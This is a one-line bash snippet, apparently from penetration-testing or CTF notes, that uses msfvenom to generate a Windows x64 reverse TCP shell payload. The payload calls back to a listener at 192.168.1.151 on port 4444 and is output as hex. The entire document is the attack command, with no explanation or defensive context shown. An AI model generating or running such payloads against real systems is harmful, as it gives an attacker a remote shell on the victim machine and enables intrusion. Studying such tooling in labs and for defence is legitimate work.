```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.151 LPORT=4444 -f hex
```